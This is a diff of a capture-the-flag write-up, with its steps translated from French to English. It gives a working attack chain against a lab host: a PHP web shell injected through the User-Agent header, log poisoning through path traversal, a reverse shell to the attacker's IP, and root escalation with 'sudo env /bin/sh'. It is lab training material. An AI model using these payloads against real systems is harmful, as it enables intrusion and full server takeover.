@@ -64,34 +64,34 @@ To get the first flag put this in url :
 ```
 
 <img width="1195" height="975" alt="image" src="https://github.com/user-attachments/assets/2e4974e3-a7bd-4154-a497-ba83d38df3f1" />
+---
 
-Pour faire une RCE : 
-sur le terminal : 
+For an RCE: 
+type in the terminal : 
 ```
 curl -s "http://10.130.149.180/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
 ```
 
-taper cette url ensuite : 
+then this url in the website : 
 ```
 http://10.130.149.180/?view=cat/../../../../var/log/apache2/access.log&ext=&cmd=id
 ```
 
-ensuite sur un terminal se mettre sur écoute :
+and then set up a listener  :
 ```
 nc -lvnp 4444
 ```
 
-ensuite taper cette url :
+then :
 ```
 http://10.130.149.180/?view=cat/../../../../var/log/apache2/access.log&ext=&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/TON_IP/4444+0>%261' 
 ```
 
-
-Bravo on a le control du serveur !!
+GG u took control of the server!!
 
 
 ---
-Pour devenir root :
+then to be a root :
 
 ```
 sudo -l 
@@ -101,8 +101,9 @@ sudo -l
 GO GTFOBINS :
 <img width="935" height="541" alt="image" src="https://github.com/user-attachments/assets/24ed595a-0030-4de5-be23-79c5603e6784" />
 
-donc :
+then :
 ```
 sudo env /bin/sh
 ```
-gg t'es root
+GOOD GAME THIRD FLAG !
+---
